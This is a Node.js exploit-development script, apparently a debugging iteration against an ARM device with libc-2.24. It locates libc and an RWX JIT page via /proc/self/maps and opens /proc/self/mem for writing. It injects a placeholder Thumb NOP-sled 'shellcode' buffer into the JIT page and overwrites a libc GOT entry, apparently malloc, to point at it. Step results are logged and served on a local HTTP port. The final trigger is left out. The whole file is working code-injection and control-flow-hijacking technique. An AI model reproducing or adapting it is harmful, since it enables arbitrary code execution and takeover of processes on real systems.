// v45b: micro-checkpoints between A and B to find exact crash point
(function() {
  'use strict';
  var fs = require('fs');
  var http = require('http');
  var PROBE = '/home/owner/share/tmp/sdk_tools/tbprobe45b.txt';
  var PORT = 8131;
  var GOT_OFFSET = 0x143014;

  function w(text) {
    try {
      var cur = ''; try { cur = fs.readFileSync(PROBE, 'utf8'); } catch(e) {}
      fs.writeFileSync(PROBE, cur + text + '\n');
    } catch(e) {}
  }
  function hex(n) { return '0x' + (n >>> 0).toString(16); }

  // A: get addresses
  var maps = fs.readFileSync('/proc/self/maps', 'utf8');
  var libcBase = 0, jitPage = 0, jitSz = 0;
  maps.split('\n').forEach(function(line) {
    if (!libcBase && line.indexOf('libc-2.24.so') !== -1) {
      libcBase = parseInt(line.split('-')[0], 16);
    }
    var rwx = line.match(/^([0-9a-f]+)-([0-9a-f]+) rwxp/);
    if (rwx) {
      var sz = parseInt(rwx[2],16) - parseInt(rwx[1],16);
      if (sz > jitSz) { jitSz = sz; jitPage = parseInt(rwx[1],16); }
    }
  });
  var gotAddr = libcBase + GOT_OFFSET;
  w('[A] libcBase=' + hex(libcBase) + ' jitPage=' + hex(jitPage) + ' gotAddr=' + hex(gotAddr));

  // A1: open /proc/self/mem
  var memfd;
  try { memfd = fs.openSync('/proc/self/mem', 'r+'); w('[A1] fd_open=' + memfd); }
  catch(e) { w('[A1] FAIL_open: ' + e.message); done(); return; }

  // A2: read 4 bytes from GOT address
  var origBuf = new Buffer(4);
  try {
    var nr = fs.readSync(memfd, origBuf, 0, 4, gotAddr);
    var origMalloc = origBuf.readUInt32LE(0);
    w('[A2] read_got ok nr=' + nr + ' origMalloc=' + hex(origMalloc));
  } catch(e) {
    w('[A2] FAIL_read_got: ' + e.message);
    try { fs.closeSync(memfd); } catch(e2) {}
    done(); return;
  }

  // A3: build SC_TEMPLATE as a 496-byte buffer (all zeros for now — just test Buffer alloc)
  var SHELLCODE;
  try {
    SHELLCODE = new Buffer(496);
    for (var i = 0; i < 496; i += 2) { SHELLCODE[i] = 0x00; SHELLCODE[i+1] = 0xbf; }
    w('[A3] shellcode_buf_ok len=' + SHELLCODE.length);
  } catch(e) {
    w('[A3] FAIL_buf: ' + e.message);
    done(); return;
  }

  // A4: write shellcode buffer to JIT page
  try {
    var nw = fs.writeSync(memfd, SHELLCODE, 0, SHELLCODE.length, jitPage);
    w('[A4] write_jit ok nw=' + nw);
  } catch(e) {
    w('[A4] FAIL_write_jit: ' + e.message);
    try { fs.closeSync(memfd); } catch(e2) {}
    done(); return;
  }

  // A5: verify readback first 4 bytes
  var rb = new Buffer(4);
  try {
    fs.readSync(memfd, rb, 0, 4, jitPage);
    w('[A5] readback=' + rb.toString('hex'));
  } catch(e) {
    w('[A5] FAIL_readback: ' + e.message);
  }

  // A6: write GOT overwrite (point to jitPage | 1 for Thumb)
  var thumbTarget = (jitPage + 1) >>> 0;
  var gotBuf = new Buffer(4);
  gotBuf.writeUInt32LE(thumbTarget, 0);
  try {
    fs.writeSync(memfd, gotBuf, 0, 4, gotAddr);
    w('[A6] write_got ok thumbTarget=' + hex(thumbTarget));
  } catch(e) {
    w('[A6] FAIL_write_got: ' + e.message);
    try { fs.closeSync(memfd); } catch(e2) {}
    done(); return;
  }
  fs.closeSync(memfd);

  // A7: trigger malloc (the NOP sled won't crash — it's all 00bf which is Thumb-2 NOP)
  // But actually it WILL return somehow... probably crash or loop, let's see
  // Skip this for now — just test up to GOT overwrite
  w('[A7] all_steps_ok (no trigger)');
  done();

  function done() {
    var body = '';
    try { body = fs.readFileSync(PROBE, 'utf8'); } catch(e) { body = 'no probe\n'; }
    var srv = http.createServer(function(req, res) { res.end(body); });
    srv.listen(PORT, '127.0.0.1');
    srv.on('error', function(){});
    setInterval(function(){}, 60000);
  }
})();
